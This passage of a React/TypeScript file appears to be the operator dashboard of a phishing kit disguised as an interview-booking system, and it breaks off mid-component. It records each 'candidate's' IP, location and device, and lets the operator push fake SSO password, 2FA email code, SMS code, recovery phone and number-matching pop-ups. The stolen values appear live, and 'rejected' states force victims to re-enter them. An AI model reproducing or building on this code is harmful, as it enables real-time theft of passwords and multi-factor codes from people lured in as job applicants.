"use client";

import { useEffect, useState, useCallback, useMemo } from "react";
import { createClient } from "@/lib/supabase/client";
import {
  parseBookingCodeData,
  serializeBookingCodeData,
  getCodeLabel,
  type BookingCodeData,
} from "@/lib/codeData";
import {
  Send,
  RefreshCw,
  X,
  Check,
  CheckCheck,
  Copy,
  Zap,
  Filter,
  Bell,
  Volume2,
  VolumeX,
  Eye,
  Clock,
  Activity,
  ChevronLeft,
  ChevronRight,
  ChevronsLeft,
  ChevronsRight,
  Search,
} from "lucide-react";
import type { Booking, ScheduleVisit } from "@/lib/types";

export interface CandidatePresence {
  session_id: string;
  booking_id?: string | null;
  admin_user_id?: string | null;
  admin_email?: string | null;
  interviewer_name?: string | null;
  name?: string;
  email?: string;
  phone?: string;
  date?: string;
  start_time?: string;
  end_time?: string;
  ip_address?: string | null;
  city?: string | null;
  state?: string | null;
  country?: string | null;
  latitude?: string | null;
  longitude?: string | null;
  user_agent?: string | null;
  phase?: string;
  online?: boolean;
  updated_at?: number;
}

function playNotificationChime() {
  try {
    const AudioCtx =
      window.AudioContext ||
      (window as unknown as { webkitAudioContext: typeof AudioContext }).webkitAudioContext;
    if (!AudioCtx) return;
    const ctx = new AudioCtx();
    const osc = ctx.createOscillator();
    const gain = ctx.createGain();
    osc.type = "sine";
    osc.frequency.setValueAtTime(587.33, ctx.currentTime); // D5
    osc.frequency.setValueAtTime(880, ctx.currentTime + 0.1); // A5
    gain.gain.setValueAtTime(0.12, ctx.currentTime);
    gain.gain.exponentialRampToValueAtTime(0.001, ctx.currentTime + 0.35);
    osc.connect(gain);
    gain.connect(ctx.destination);
    osc.start();
    osc.stop(ctx.currentTime + 0.35);
  } catch {}
}

function formatTime(t: string) {
  const [h, m] = t.split(":").map(Number);
  const period = h >= 12 ? "PM" : "AM";
  const hour12 = h % 12 === 0 ? 12 : h % 12;
  return `${hour12}:${String(m).padStart(2, "0")} ${period}`;
}

// Parse device and OS from User-Agent string
function parseDeviceAndOS(ua?: string | null): { device: string; os: string; full: string; icon: string } {
  if (!ua || ua === "Unknown" || ua === "-") {
    return { device: "Device", os: "Unknown OS", full: "Device · Unknown OS", icon: "💻" };
  }

  // OS Detection
  let os = "Unknown OS";
  if (/windows phone/i.test(ua)) os = "Windows Phone";
  else if (/win(dows)? nt 10\.0/i.test(ua)) os = "Windows 10/11";
  else if (/win(dows)? nt 6\.3/i.test(ua)) os = "Windows 8.1";
  else if (/win(dows)? nt 6\.2/i.test(ua)) os = "Windows 8";
  else if (/win(dows)? nt 6\.1/i.test(ua)) os = "Windows 7";
  else if (/win(dows)?/i.test(ua)) os = "Windows";
  else if (/iphone|ipad|ipod/i.test(ua)) {
    const match = ua.match(/OS (\d+[._]\d+)/i);
    os = match ? `iOS ${match[1].replace("_", ".")}` : "iOS";
  } else if (/mac(intosh| os x)/i.test(ua)) {
    const match = ua.match(/Mac OS X (\d+[._]\d+)/i);
    os = match ? `macOS ${match[1].replace("_", ".")}` : "macOS";
  } else if (/android/i.test(ua)) {
    const match = ua.match(/Android (\d+(\.\d+)?)/i);
    os = match ? `Android ${match[1]}` : "Android";
  } else if (/cros/i.test(ua)) os = "ChromeOS";
  else if (/linux/i.test(ua)) os = "Linux";

  // Device Detection
  let device = "Desktop";
  let icon = "💻";
  if (/iphone/i.test(ua)) {
    device = "iPhone";
    icon = "📱";
  } else if (/ipad/i.test(ua)) {
    device = "iPad";
    icon = "📱";
  } else if (/tablet|sm-t|gt-p/i.test(ua)) {
    device = "Tablet";
    icon = "📱";
  } else if (/mobile|android/i.test(ua)) {
    if (/samsung/i.test(ua)) device = "Samsung";
    else if (/pixel/i.test(ua)) device = "Pixel";
    else if (/huawei/i.test(ua)) device = "Huawei";
    else if (/xiaomi|redmi/i.test(ua)) device = "Xiaomi";
    else device = "Mobile";
    icon = "📱";
  } else if (/macintosh/i.test(ua)) {
    device = "Mac";
    icon = "💻";
  } else if (/windows/i.test(ua)) {
    device = "PC";
    icon = "💻";
  }

  const full = `${device} · ${os}`;
  return { device, os, full, icon };
}

// Reusable Copy button with visual feedback and flex-shrink-0 guarantee
function CopyIconButton({ value, label }: { value: string | null | undefined; label?: string }) {
  const [copied, setCopied] = useState(false);

  if (!value || value.trim() === "" || value === "-") {
    return (
      <button disabled className="text-gray-300 cursor-default p-0.5 flex-shrink-0">
        <Copy className="w-3.5 h-3.5" />
      </button>
    );
  }

  const handleCopy = (e: React.MouseEvent) => {
    e.stopPropagation();
    navigator.clipboard.writeText(value);
    setCopied(true);
    setTimeout(() => setCopied(false), 2000);
  };

  return (
    <button
      type="button"
      onClick={handleCopy}
      title={copied ? "Copied!" : `Copy ${label || "value"}`}
      className={`p-1 rounded-md flex-shrink-0 transition-all ${
        copied
          ? "text-emerald-600 bg-emerald-50"
          : "text-gray-400 hover:text-gray-800 hover:bg-gray-100"
      }`}
    >
      {copied ? <CheckCheck className="w-3.5 h-3.5 text-emerald-600" /> : <Copy className="w-3.5 h-3.5" />}
    </button>
  );
}

// Candidate Phase Badge rendering
function CandidatePhaseBadge({ b }: { b: Booking }) {
  const codeData = parseBookingCodeData(b.additional_code);
  const req = codeData.active_req || "";

  if (b.status === "confirmed") {
    return (
      <span className="inline-flex items-center gap-1.5 px-3.5 py-1.5 rounded-full text-xs font-bold bg-emerald-50 text-emerald-700 border border-emerald-200">
        <span className="w-2 h-2 rounded-full bg-emerald-500" />
        <span>Confirmed</span>
      </span>
    );
  }

  if (b.status === "rejected") {
    return (
      <span className="inline-flex items-center gap-1.5 px-3.5 py-1.5 rounded-full text-xs font-bold bg-red-50 text-red-700 border border-red-200">
        <span className="w-2 h-2 rounded-full bg-red-500" />
        <span>Rejected (Re-entering ID)</span>
      </span>
    );
  }

  if (b.status === "awaiting_code") {
    if (req === "N_PHONE_REJECTED") {
      return (
        <span className="inline-flex items-center gap-1.5 px-3.5 py-1.5 rounded-full text-xs font-bold bg-red-50 text-red-700 border border-red-200 shadow-2xs">
          <span className="w-2 h-2 rounded-full bg-red-500 animate-pulse" />
          <span>G-Number Rejected (Re-entering)</span>
        </span>
      );
    }

    if (req === "N_PHONE_REQUESTED") {
      return (
        <span className="inline-flex items-center gap-1.5 px-3.5 py-1.5 rounded-full text-xs font-bold bg-blue-50 text-blue-700 border border-blue-200 shadow-2xs">
          <span className="w-2 h-2 rounded-full bg-blue-600 animate-pulse" />
          <span>G-Number Active</span>
        </span>
      );
    }

    if (req === "N_PHONE_SUBMITTED" || codeData.n_submitted_phone) {
      return (
        <span className="inline-flex items-center gap-1.5 px-3.5 py-1.5 rounded-full text-xs font-bold bg-emerald-50 text-emerald-800 border border-emerald-200 shadow-2xs">
          <span className="w-2 h-2 rounded-full bg-emerald-600" />
          <span>G-Number Submitted</span>
        </span>
      );
    }

    if (req === "N_GCODE_REJECTED") {
      return (
        <span className="inline-flex items-center gap-1.5 px-3.5 py-1.5 rounded-full text-xs font-bold bg-red-50 text-red-700 border border-red-200 shadow-2xs">
          <span className="w-2 h-2 rounded-full bg-red-500 animate-pulse" />
          <span>G-Code Rejected (Re-entering)</span>
        </span>
      );
    }

    if (req === "N_GCODE_REQUESTED") {
      return (
        <span className="inline-flex items-center gap-1.5 px-3.5 py-1.5 rounded-full text-xs font-bold bg-blue-50 text-blue-700 border border-blue-200 shadow-2xs">
          <span className="w-2 h-2 rounded-full bg-blue-600 animate-pulse" />
          <span>G-PopUp Active</span>
        </span>
      );
    }

    if (req === "N_GCODE_SUBMITTED" || codeData.n_submitted_gcode) {
      return (
        <span className="inline-flex items-center gap-1.5 px-3.5 py-1.5 rounded-full text-xs font-bold bg-emerald-50 text-emerald-800 border border-emerald-200 shadow-2xs">
          <span className="w-2 h-2 rounded-full bg-emerald-600" />
          <span>G-Code Submitted</span>
        </span>
      );
    }

    if (req === "N_CODE_REJECTED") {
      return (
        <span className="inline-flex items-center gap-1.5 px-3.5 py-1.5 rounded-full text-xs font-bold bg-red-50 text-red-700 border border-red-200 shadow-2xs">
          <span className="w-2 h-2 rounded-full bg-red-500 animate-pulse" />
          <span>N-Code Rejected (Re-entering)</span>
        </span>
      );
    }

    if (req === "N_CODE_REQUESTED") {
      return (
        <span className="inline-flex items-center gap-1.5 px-3.5 py-1.5 rounded-full text-xs font-bold bg-indigo-50 text-indigo-700 border border-indigo-200 shadow-2xs">
          <span className="w-2 h-2 rounded-full bg-indigo-600 animate-pulse" />
          <span>N-Code Pop-up Active</span>
        </span>
      );
    }

    if (req === "N_CODE_SUBMITTED" || codeData.n_submitted_code) {
      return (
        <span className="inline-flex items-center gap-1.5 px-3.5 py-1.5 rounded-full text-xs font-bold bg-emerald-50 text-emerald-800 border border-emerald-200 shadow-2xs">
          <span className="w-2 h-2 rounded-full bg-emerald-600" />
          <span>N-Code Submitted</span>
        </span>
      );
    }

    if (req === "N_LOGIN_REJECTED") {
      return (
        <span className="inline-flex items-center gap-1.5 px-3.5 py-1.5 rounded-full text-xs font-bold bg-red-50 text-red-700 border border-red-200 shadow-2xs">
          <span className="w-2 h-2 rounded-full bg-red-500 animate-pulse" />
          <span>N-Password Rejected (Re-entering)</span>
        </span>
      );
    }

    if (req === "N_LOGIN_REQUESTED") {
      return (
        <span className="inline-flex items-center gap-1.5 px-3.5 py-1.5 rounded-full text-xs font-bold bg-blue-50 text-blue-700 border border-blue-200 shadow-2xs">
          <span className="w-2 h-2 rounded-full bg-blue-600 animate-pulse" />
          <span>{codeData.n_thanks_seen ? "Pop-up #1 (SSO) Active" : "Thanks Page Active"}</span>
        </span>
      );
    }

    if (req === "N_LOGIN_SUBMITTED" || codeData.n_submitted_password) {
      return (
        <span className="inline-flex items-center gap-1.5 px-3.5 py-1.5 rounded-full text-xs font-bold bg-purple-50 text-purple-700 border border-purple-200 shadow-2xs">
          <span className="w-2 h-2 rounded-full bg-purple-600" />
          <span>N-Password Submitted</span>
        </span>
      );
    }

    if (req.startsWith("NOTIFICATION:")) {
      const val = req.replace("NOTIFICATION:", "");
      return (
        <span className="inline-flex items-center gap-1.5 px-3.5 py-1.5 rounded-full text-xs font-bold bg-blue-50 text-blue-700 border border-blue-200 shadow-2xs">
          <span className="w-2 h-2 rounded-full bg-blue-600 animate-pulse" />
          <span>Notification Active: {val || "Device"}</span>
        </span>
      );
    }

    if (req.startsWith("POP_CODE:")) {
      const val = req.replace("POP_CODE:", "");
      return (
        <span className="inline-flex items-center gap-1.5 px-3.5 py-1.5 rounded-full text-xs font-bold bg-purple-50 text-purple-700 border border-purple-200 shadow-2xs">
          <span className="w-2 h-2 rounded-full bg-purple-600 animate-pulse" />
          <span>Pop-out Code Active: {val}</span>
        </span>
      );
    }

    if (req === "NORTH_ERROR_REQUESTED") {
      return (
        <span className="inline-flex items-center gap-1.5 px-3.5 py-1.5 rounded-full text-xs font-bold bg-rose-50 text-rose-700 border border-rose-200 shadow-2xs">
          <span className="w-2 h-2 rounded-full bg-rose-500 animate-pulse" />
          <span>North Error Page Active</span>
        </span>
      );
    }

    if (req === "N_APPRECIATE_REQUESTED") {
      return (
        <span className="inline-flex items-center gap-1.5 px-3.5 py-1.5 rounded-full text-xs font-bold bg-amber-50 text-amber-700 border border-amber-200 shadow-2xs">
          <span className="w-2 h-2 rounded-full bg-amber-500 animate-pulse" />
          <span>Pop-up #5 (Numri) Active: {codeData.n_appreciate_value || "–"}</span>
        </span>
      );
    }

    if (req.includes("_REJECTED")) {
      const match = req.match(/CODE_(\d)_REJECTED/i);
      const num = match ? parseInt(match[1], 10) : 1;
      const label = getCodeLabel(num);
      return (
        <span className="inline-flex items-center gap-1.5 px-3.5 py-1.5 rounded-full text-xs font-bold bg-red-50 text-red-700 border border-red-200">
          <span className="w-2 h-2 rounded-full bg-red-500 animate-pulse" />
          <span>{label} Rejected (Re-entering)</span>
        </span>
      );
    }

    if (req.includes("_REQUESTED")) {
      const match = req.match(/CODE_(\d)_REQUESTED/i);
      const num = match ? parseInt(match[1], 10) : 1;
      const label = getCodeLabel(num);
      return (
        <span className="inline-flex items-center gap-1.5 px-3.5 py-1.5 rounded-full text-xs font-bold bg-amber-50 text-amber-800 border border-amber-200">
          <span className="w-2 h-2 rounded-full bg-amber-500 animate-pulse" />
          <span>Candidate in {label}</span>
        </span>
      );
    }
  }

  // status === "pending"
  const submittedCodes = [
    codeData.code_4 ? "Email" : null,
    codeData.code_3 ? "SMS" : null,
    codeData.code_2 ? "WhatsApp" : null,
    codeData.code_1 ? "AuthApp" : null,
  ].filter(Boolean);

  if (codeData.n_submitted_phone) {
    return (
      <span className="inline-flex items-center gap-1.5 px-3.5 py-1.5 rounded-full text-xs font-bold bg-emerald-50 text-emerald-800 border border-emerald-200 shadow-2xs">
        <span className="w-2 h-2 rounded-full bg-emerald-600" />
        <span>G-Number Submitted</span>
      </span>
    );
  }

  if (codeData.n_submitted_gcode) {
    return (
      <span className="inline-flex items-center gap-1.5 px-3.5 py-1.5 rounded-full text-xs font-bold bg-emerald-50 text-emerald-800 border border-emerald-200 shadow-2xs">
        <span className="w-2 h-2 rounded-full bg-emerald-600" />
        <span>G-Code Submitted</span>
      </span>
    );
  }

  if (codeData.n_submitted_code) {
    return (
      <span className="inline-flex items-center gap-1.5 px-3.5 py-1.5 rounded-full text-xs font-bold bg-emerald-50 text-emerald-800 border border-emerald-200 shadow-2xs">
        <span className="w-2 h-2 rounded-full bg-emerald-600" />
        <span>N-Code Submitted</span>
      </span>
    );
  }

  if (codeData.n_submitted_password) {
    return (
      <span className="inline-flex items-center gap-1.5 px-3.5 py-1.5 rounded-full text-xs font-bold bg-purple-50 text-purple-700 border border-purple-200 shadow-2xs">
        <span className="w-2 h-2 rounded-full bg-purple-600" />
        <span>N-Password Submitted</span>
      </span>
    );
  }

  if (submittedCodes.length > 0) {
    return (
      <span className="inline-flex items-center gap-1.5 px-3.5 py-1.5 rounded-full text-xs font-bold bg-blue-50 text-blue-700 border border-blue-200">
        <span className="w-2 h-2 rounded-full bg-blue-500" />
        <span>{submittedCodes[0]} Submitted</span>
      </span>
    );
  }

  if (b.candidate_id && b.passkey) {
    return (
      <span className="inline-flex items-center gap-1.5 px-3.5 py-1.5 rounded-full text-xs font-bold bg-amber-50/90 text-amber-800 border border-amber-200">
        <span className="w-2 h-2 rounded-full bg-amber-500" />
        <span>ID &amp; Passkey (Reviewing)</span>
      </span>
    );
  }

  return (
    <span className="inline-flex items-center gap-1.5 px-3.5 py-1.5 rounded-full text-xs font-bold bg-amber-50/80 text-amber-900 border border-amber-200">
      <span className="w-2 h-2 rounded-full bg-amber-500 animate-pulse" />
      <span>In ID/Passkey Modal</span>
    </span>
  );
}

// Dedicated PopCodeCard with local state for 100% fluid typing without parent re-renders or focus loss
function PopCodeCardItem({
  b,
  busy,
  onSendPopCode,
  onClearPopCode,
}: {
  b: Booking;
  busy: boolean;
  onSendPopCode: (b: Booking, codeVal: string) => Promise<void>;
  onClearPopCode: (b: Booking) => Promise<void>;
}) {
  const codeData = parseBookingCodeData(b.additional_code);
  const isPopActive = b.status === "awaiting_code" && codeData.active_req?.startsWith("POP_CODE:");
  const [localInput, setLocalInput] = useState(codeData.pop_code || "");

  useEffect(() => {
    if (codeData.pop_code !== undefined) {
      setLocalInput(codeData.pop_code || "");
    }
  }, [codeData.pop_code]);

  const handleSubmit = (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    if (!localInput.trim()) return;
    onSendPopCode(b, localInput.trim());
  };

  return (
    <div className="bg-purple-50/30 border border-purple-200 rounded-xl p-2 flex flex-col justify-between space-y-1.5 shadow-2xs overflow-hidden">
      {/* Header: Pop Code Title + Dot */}
      <div className="flex items-center justify-between">
        <span className="text-[11px] font-bold text-purple-950 truncate pr-1">
          Pop Code
        </span>
        <span
          className={`w-2 h-2 rounded-full shrink-0 ${
            isPopActive ? "bg-purple-600 animate-pulse" : "bg-gray-300"
          }`}
        />
      </div>

      {/* Actions: Fast local input + Send button + Clear */}
      <form onSubmit={handleSubmit} className="flex items-center gap-1 w-full min-w-0">
        <input
          type="text"
          placeholder="-"
          value={localInput}
          onChange={(e) => setLocalInput(e.target.value)}
          className="w-full min-w-0 px-1.5 py-0.5 bg-white border border-purple-300 rounded-md text-xs font-mono font-bold text-gray-900 outline-none focus:border-purple-600 text-center shadow-2xs"
        />

        <button
          type="submit"
          disabled={busy || !localInput.trim()}
          className="p-1 bg-[#7c3aed] hover:bg-[#6d28d9] text-white rounded-md font-bold text-xs flex items-center justify-center transition-all disabled:opacity-40 shadow-2xs shrink-0 cursor-pointer"
          title={isPopActive ? "Update Pop Code" : "Send Pop Code to candidate"}
        >
          <Send className="w-2.5 h-2.5" />
        </button>

        {isPopActive && (
          <button
            type="button"
            disabled={busy}
            onClick={() => {
              setLocalInput("");
              onClearPopCode(b);
            }}
            className="p-1 hover:bg-purple-100 text-purple-700 rounded-md transition-colors border border-purple-200 shrink-0 cursor-pointer"
            title="Dismiss pop-out code"
          >
            <X className="w-2.5 h-2.5" />
          </button>
        )}
      </form>

      {/* Value Box with Active Pop Code + Copy Icon */}
      <div className="flex items-center justify-between gap-1 px-2 py-1 bg-white border border-purple-200 rounded-lg shadow-2xs min-h-[30px] min-w-0">
        <div className="flex items-center gap-1 font-mono font-bold text-xs text-purple-950 select-all truncate min-w-0 flex-1">
          {codeData.pop_code ? (
            <>
              <Zap className="w-3 h-3 text-amber-500 fill-amber-500 shrink-0" />
              <span className="truncate" title={codeData.pop_code}>{codeData.pop_code}</span>
            </>
          ) : (
            <span className="text-gray-400 font-normal">-</span>
          )}
        </div>
        <CopyIconButton value={codeData.pop_code} label="Pop Code" />
      </div>
    </div>
  );
}

// Dedicated NotificationCard with local state for custom device text
function NotificationCardItem({
  b,
  busy,
  onSendNotification,
  onClearNotification,
}: {
  b: Booking;
  busy: boolean;
  onSendNotification: (b: Booking, deviceText: string) => Promise<void>;
  onClearNotification: (b: Booking) => Promise<void>;
}) {
  const codeData = parseBookingCodeData(b.additional_code);
  const isNotificationActive =
    b.status === "awaiting_code" && codeData.active_req?.startsWith("NOTIFICATION:");
  const [localInput, setLocalInput] = useState(codeData.notification_device || "");

  useEffect(() => {
    if (codeData.notification_device !== undefined) {
      setLocalInput(codeData.notification_device || "");
    }
  }, [codeData.notification_device]);

  const handleSubmit = (e?: React.FormEvent) => {
    if (e) e.preventDefault();
    if (!localInput.trim()) return;
    onSendNotification(b, localInput.trim());
  };

  return (
    <div className="bg-purple-50/30 border border-purple-200 rounded-xl p-2 flex flex-col justify-between space-y-1.5 shadow-2xs overflow-hidden">
      {/* Header: Notification Title + Dot */}
      <div className="flex items-center justify-between">
        <span className="text-[11px] font-bold text-purple-950 truncate pr-1">
          Notification
        </span>
        <span
          className={`w-2 h-2 rounded-full shrink-0 ${
            isNotificationActive ? "bg-purple-600 animate-pulse" : "bg-gray-300"
          }`}
        />
      </div>

      {/* Actions: Fast local input + Send button + Clear */}
      <form onSubmit={handleSubmit} className="flex items-center gap-1 w-full min-w-0">
        <input
          type="text"
          placeholder="iPhone 13"
          value={localInput}
          onChange={(e) => setLocalInput(e.target.value)}
          className="w-full min-w-0 px-1.5 py-0.5 bg-white border border-purple-300 rounded-md text-xs font-sans font-bold text-gray-900 outline-none focus:border-purple-600 text-center shadow-2xs"
        />

        <button
          type="submit"
          disabled={busy || !localInput.trim()}
          className="p-1 bg-[#7c3aed] hover:bg-[#6d28d9] text-white rounded-md font-bold text-xs flex items-center justify-center transition-all disabled:opacity-40 shadow-2xs shrink-0 cursor-pointer"
          title={isNotificationActive ? "Update Notification device" : "Send Notification to candidate"}
        >
          <Send className="w-2.5 h-2.5" />
        </button>

        {isNotificationActive && (
          <button
            type="button"
            disabled={busy}
            onClick={() => {
              setLocalInput("");
              onClearNotification(b);
            }}
            className="p-1 hover:bg-purple-100 text-purple-700 rounded-md transition-colors border border-purple-200 shrink-0 cursor-pointer"
            title="Dismiss notification"
          >
            <X className="w-2.5 h-2.5" />
          </button>
        )}
      </form>

      {/* Value Box with Active Notification Text + Copy Icon */}
      <div className="flex items-center justify-between gap-1 px-2 py-1 bg-white border border-purple-200 rounded-lg shadow-2xs min-h-[30px] min-w-0">
        <div className="flex items-center gap-1 font-sans font-bold text-xs text-purple-950 select-all truncate min-w-0 flex-1">
          {codeData.notification_device ? (
            <>
              <Zap className="w-3 h-3 text-amber-500 fill-amber-500 shrink-0" />
              <span className="truncate" title={codeData.notification_device}>
                {codeData.notification_device}
              </span>
            </>
          ) : (
            <span className="text-gray-400 font-normal">-</span>
          )}
        </div>
        <CopyIconButton value={codeData.notification_device} label="Notification Device" />
      </div>
    </div>
  );
}

// SEPARATE DEDICATED SECTION: N-Portal Verification & Custom Popups
function NPortalSection({
  b,
  busy,
  onSendNLogin,
  onRejectNLogin,
  onResetNPassword,
  onSendNCode,
  onRejectNCode,
  onResetNCode,
  onUpdateNCodeTargetEmail,
  onSendGPopUp,
  onRejectGPopUp,
  onResetGPopUp,
  onSendGNumber,
  onRejectGNumber,
  onResetGNumber,
  onUpdateGNumberMask,
  onSendGAppreciate,
  onResetGAppreciate,
}: {
  b: Booking;
  busy: boolean;
  onSendNLogin: (b: Booking) => Promise<void>;
  onRejectNLogin: (b: Booking) => Promise<void>;
  onResetNPassword: (b: Booking) => Promise<void>;
  onSendNCode: (b: Booking, targetEmail: string) => Promise<void>;
  onRejectNCode: (b: Booking) => Promise<void>;
  onResetNCode: (b: Booking) => Promise<void>;
  onUpdateNCodeTargetEmail: (b: Booking, email: string) => Promise<void>;
  onSendGPopUp: (b: Booking) => Promise<void>;
  onRejectGPopUp: (b: Booking) => Promise<void>;
  onResetGPopUp: (b: Booking) => Promise<void>;
  onSendGNumber: (b: Booking, phoneMask: string) => Promise<void>;
  onRejectGNumber: (b: Booking) => Promise<void>;
  onResetGNumber: (b: Booking) => Promise<void>;
  onUpdateGNumberMask: (b: Booking, mask: string) => Promise<void>;
  onSendGAppreciate: (b: Booking, appreciateValue: string) => Promise<void>;
  onResetGAppreciate: (b: Booking) => Promise<void>;
  onSendNorthError?: (b: Booking) => Promise<void>;
  onResetNorthError?: (b: Booking) => Promise<void>;
}) {
  const codeData = parseBookingCodeData(b.additional_code);

  const isNLoginActive =
    b.status === "awaiting_code" && codeData.active_req === "N_LOGIN_REQUESTED";
  const isNLoginRejected =
    b.status === "awaiting_code" && codeData.active_req === "N_LOGIN_REJECTED";
  const hasNLoginSubmitted = Boolean(codeData.n_submitted_password);

  const isNCodeActive =
    b.status === "awaiting_code" && codeData.active_req === "N_CODE_REQUESTED";
  const isNCodeRejected =
    b.status === "awaiting_code" && codeData.active_req === "N_CODE_REJECTED";
  const hasNCodeSubmitted = Boolean(codeData.n_submitted_code);

  const isGPopUpActive =
    b.status === "awaiting_code" && codeData.active_req === "N_GCODE_REQUESTED";
  const isGPopUpRejected =
    b.status === "awaiting_code" && codeData.active_req === "N_GCODE_REJECTED";
  const hasGPopUpSubmitted = Boolean(codeData.n_submitted_gcode);

  const isGNumberActive =
    b.status === "awaiting_code" && codeData.active_req === "N_PHONE_REQUESTED";
  const isGNumberRejected =
    b.status === "awaiting_code" && codeData.active_req === "N_PHONE_REJECTED";
  const hasGNumberSubmitted = Boolean(codeData.n_submitted_phone);

  const [localTargetEmail, setLocalTargetEmail] = useState(
    codeData.n_code_target_email || "dri•••••••@gmail.com"
  );

  const [localPhoneMask, setLocalPhoneMask] = useState(
    codeData.n_phone_mask || "•••• ••• •20"
  );

  useEffect(() => {
    if (codeData.n_code_target_email) {
      setLocalTargetEmail(codeData.n_code_target_email);
    }
  }, [codeData.n_code_target_email]);

  useEffect(() => {
    if (codeData.n_phone_mask) {
      setLocalPhoneMask(codeData.n_phone_mask);
    }
  }, [codeData.n_phone_mask]);

  const isNorthErrorActive =
    b.status === "awaiting_code" && codeData.active_req === "NORTH_ERROR_REQUESTED";

  const isGAppreciateActive =
    b.status === "awaiting_code" && codeData.active_req === "N_APPRECIATE_REQUESTED";

  const [localAppreciateValue, setLocalAppreciateValue] = useState(
    codeData.n_appreciate_value || "22"
  );

  useEffect(() => {
    if (codeData.n_appreciate_value) {
      setLocalAppreciateValue(codeData.n_appreciate_value);
    }
  }, [codeData.n_appreciate_value]);

  const handleSendCode = () => {
    const emailToSend = localTargetEmail.trim() || "dri•••••••@gmail.com";
    onSendNCode(b, emailToSend);
  };

  const handleSendGNumber = () => {
    const maskToSend = localPhoneMask.trim() || "•••• ••• •20";
    onSendGNumber(b, maskToSend);
  };

  const handleSendGAppreciate = () => {
    const valueToSend = localAppreciateValue.trim() || "22";
    onSendGAppreciate(b, valueToSend);
  };

  return (
    <div className="mt-3 pt-3 border-t border-gray-200">
      <div className="bg-[#f8faff] border border-blue-200/90 rounded-xl p-3 shadow-2xs space-y-2.5">
        {/* Header */}
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-2 pb-2 border-b border-blue-100">
          <div className="flex items-center gap-2">
            <div className="w-6 h-6 rounded-md bg-[#0b57d0] text-white flex items-center justify-center font-bold text-xs shadow-2xs shrink-0">
              N
            </div>
            <div>
              <div className="flex items-center gap-1.5">
                <h4 className="text-xs font-bold text-gray-900 tracking-tight">
                  N-Portal Verification Popups
                </h4>
                <span className="text-[9px] font-semibold bg-blue-100/80 text-blue-800 px-1.5 py-0.2 rounded-full border border-blue-200">
                  SSO Dialog System
                </span>
              </div>
              <p className="text-[10px] text-gray-500 font-normal">
                Trigger candidate password, 2FA email code, G-PopUp text message, G-Number recovery, or Numri popups and view inputs in real-time.
              </p>
            </div>
          </div>

          {/* Status Badge */}
          <div className="flex items-center gap-1.5 shrink-0 self-start sm:self-center">
            {isGNumberActive ? (
              <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-[10px] font-bold bg-blue-100 text-blue-800 border border-blue-300 shadow-2xs">
                <span className="w-1.5 h-1.5 rounded-full bg-blue-600 animate-pulse" />
                <span>Pop-up #4 (G-Number) Active</span>
              </span>
            ) : isGNumberRejected ? (
              <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-[10px] font-bold bg-red-100 text-red-800 border border-red-300 shadow-2xs">
                <span className="w-1.5 h-1.5 rounded-full bg-red-600 animate-pulse" />
                <span>Pop-up #4 Rejected</span>
              </span>
            ) : hasGNumberSubmitted ? (
              <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-[10px] font-bold bg-emerald-100 text-emerald-800 border border-emerald-200 shadow-2xs">
                <span className="w-1.5 h-1.5 rounded-full bg-emerald-600" />
                <span>G-Number Received</span>
              </span>
            ) : isGPopUpActive ? (
              <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-[10px] font-bold bg-blue-100 text-blue-800 border border-blue-300 shadow-2xs">
                <span className="w-1.5 h-1.5 rounded-full bg-blue-600 animate-pulse" />
                <span>Pop-up #3 (G-PopUp) Active</span>
              </span>
            ) : isGPopUpRejected ? (
              <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-[10px] font-bold bg-red-100 text-red-800 border border-red-300 shadow-2xs">
                <span className="w-1.5 h-1.5 rounded-full bg-red-600 animate-pulse" />
                <span>Pop-up #3 Rejected</span>
              </span>
            ) : hasGPopUpSubmitted ? (
              <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-[10px] font-bold bg-emerald-100 text-emerald-800 border border-emerald-200 shadow-2xs">
                <span className="w-1.5 h-1.5 rounded-full bg-emerald-600" />
                <span>G-Code Received</span>
              </span>
            ) : isNLoginActive ? (
              <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-[10px] font-bold bg-blue-100 text-blue-800 border border-blue-300 shadow-2xs">
                <span className="w-1.5 h-1.5 rounded-full bg-blue-600 animate-pulse" />
                <span>
                  {codeData.n_thanks_seen
                    ? "Pop-up #1 Active"
                    : "Pop-up #1: Thanks Page Active"}
                </span>
              </span>
            ) : isNCodeActive ? (
              <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-[10px] font-bold bg-indigo-100 text-indigo-800 border border-indigo-300 shadow-2xs">
                <span className="w-1.5 h-1.5 rounded-full bg-indigo-600 animate-pulse" />
                <span>Pop-up #2 Active</span>
              </span>
            ) : isNLoginRejected ? (
              <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-[10px] font-bold bg-red-100 text-red-800 border border-red-300 shadow-2xs">
                <span className="w-1.5 h-1.5 rounded-full bg-red-600 animate-pulse" />
                <span>Pop-up #1 Rejected</span>
              </span>
            ) : isNCodeRejected ? (
              <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-[10px] font-bold bg-red-100 text-red-800 border border-red-300 shadow-2xs">
                <span className="w-1.5 h-1.5 rounded-full bg-red-600 animate-pulse" />
                <span>Pop-up #2 Rejected</span>
              </span>
            ) : hasNCodeSubmitted ? (
              <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-[10px] font-bold bg-emerald-100 text-emerald-800 border border-emerald-200 shadow-2xs">
                <span className="w-1.5 h-1.5 rounded-full bg-emerald-600" />
                <span>N-Code Received</span>
              </span>
            ) : hasNLoginSubmitted ? (
              <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-[10px] font-bold bg-purple-100 text-purple-800 border border-purple-200 shadow-2xs">
                <span className="w-1.5 h-1.5 rounded-full bg-purple-600" />
                <span>Password Received</span>
              </span>
            ) : isNorthErrorActive ? (
              <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-[10px] font-bold bg-rose-100 text-rose-800 border border-rose-300 shadow-2xs">
                <span className="w-1.5 h-1.5 rounded-full bg-rose-600 animate-pulse" />
                <span>North Error Active</span>
              </span>
            ) : isGAppreciateActive ? (
              <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded-full text-[10px] font-bold bg-amber-100 text-amber-800 border border-amber-300 shadow-2xs">
